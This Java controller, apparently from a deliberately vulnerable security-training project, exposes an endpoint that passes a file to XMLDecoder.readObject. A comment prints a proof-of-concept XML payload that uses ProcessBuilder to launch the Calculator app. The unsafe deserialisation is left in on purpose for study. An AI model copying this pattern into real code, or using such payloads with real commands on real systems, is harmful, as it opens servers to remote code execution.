package org.joychou.controller.rce;

import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import java.io.BufferedInputStream;
import java.io.FileInputStream;


@RestController
@RequestMapping("/rce")
public class xmlDecoderRCE {

    @RequestMapping(value = "/xmldecoder")
    public static String xmlDecoder(){
        /*
        https://www.kingkk.com/2019/05/Weblogic-XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/
        poc.xml

        <?xml version="1.0" encoding="UTF-8"?>
        <java  class="java.beans.XMLDecoder">
            <object class="java.lang.ProcessBuilder">
                <array class="java.lang.String" length="1">
                    <void index="0">
                        <string>/Applications/Calculator.app/Contents/MacOS/Calculator</string>
                    </void>
                </array>
                <void method="start" />
            </object>
        </java>

        * */

        try {
//          ClassPathResource resource = new ClassPathResource("poc" + File.separator +"xmldecoderRCE.xml");
//          File file = resource.getFile();

            java.io.File file = new java.io.File("src/main/resources/poc/xmldecodeRCE.xml");
            java.beans.XMLDecoder xd;

            xd = new java.beans.XMLDecoder(new BufferedInputStream(new FileInputStream(file)));
            xd.readObject();
            xd.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return "success";

    }
    public static void main(String[] args) {
        xmlDecoder();
    }
}